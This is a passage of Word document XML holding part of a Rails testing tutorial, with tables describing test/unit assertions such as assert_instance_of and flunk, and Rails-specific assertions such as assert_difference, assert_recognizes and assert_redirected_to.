            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E51B84E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that the given block doesn’t raise one of the given exceptions.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="12D0C528" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="554CA9B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_instance_of( class, obj, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79176D80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is of the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> type.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="57C5851C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E285A88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_kind_of( class, obj, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D260CCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is or descends from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="44A1867B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F907A4F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_respond_to( obj, symbol, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74B0FB31" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> has a method called </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>symbol</w:t>
            </w:r>
            <w:r>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="198A7534" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03B0E3F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_operator( obj1, operator, obj2, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3425646D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj1.operator(obj2)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is true.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="2F3DC657" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FBF09EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_send( array, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EECD897" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that executing the method listed in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>array[1]</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> on the object in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>array[0]</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> with the parameters of </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>array[2 and up]</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is true. This one is weird eh?</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="683A911D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FEEB4E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>flunk( [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="339EA55C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures failure. This is useful to explicitly mark a test that isn’t finished yet.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29DDE572" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Because of the modular nature of the testing framework, it is possible to create your own assertions. In fact, that’s exactly what Rails does. It includes some specialized assertions to make your life easier.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B80D12" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Creating your own assertions is an advanced topic that we won’t cover in this tutorial.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDA5064" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Rails Specific Assertions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254AF8E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails adds some custom assertions of its own to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> framework:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483B7109" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_valid(record)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has been deprecated. Please use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert(record.valid?)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead.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0"/>
        <w:gridCol w:w="4086"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="14542742" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B6C4C2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Assertion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74B30F05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="238CC6CC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B72CCF0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_valid(record)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E2D1BB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that the passed record is valid by Active Record standards and returns any error messages if it is not.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="190ACB99" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6AB34411" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_difference(expressions, difference = 1, message = nil) {...}</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A4736B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test numeric difference between the return value of an expression as a result of what is evaluated in the yielded block.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="0B40C82F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E315A36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_no_difference(expressions, message = nil, &amp;block)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="565EBB35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Asserts that the numeric result of evaluating an expression is not changed before and after invoking the passed in block.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="0DA68431" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F4C6414" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_recognizes(expected_options, path, extras={}, message=nil)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40A8252A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Asserts that the routing of the given path was handled correctly and that the parsed options (given in the expected_options hash) match path. Basically, it asserts that Rails recognizes the route given by expected_options.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="0E0DD1A1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="482A0DAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_generates(expected_path, options, defaults={}, extras = {}, message=nil)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="105AFFA3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Asserts that the provided options can be used to generate the provided path. This is the inverse of assert_recognizes. The extras parameter is used to tell the request the names and values of additional request parameters that would be in a query string. The message parameter allows you to specify a custom error message for assertion failures.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="59A99BC5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="432FD6EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_response(type, message = nil)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D54CF83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Asserts that the response comes with a specific status code. You can specify </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:success</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> to indicate 200, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:redirect</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> to indicate 300-399, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:missing</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> to indicate 404, or </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>:error</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> to match the 500-599 range</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="5E339142" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5AC9C3D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_redirected_to(options = {}, message=nil)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="096AB878" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Assert that the redirection options passed in match those of the redirect called in the latest action. This match can be partial, such that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_redirected_to(:controller =&gt; "weblog")</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> will also match the redirection of </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>redirect_to(:controller =&gt; "weblog", :action =&gt; "show")</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> and so on.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="5B158A9A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
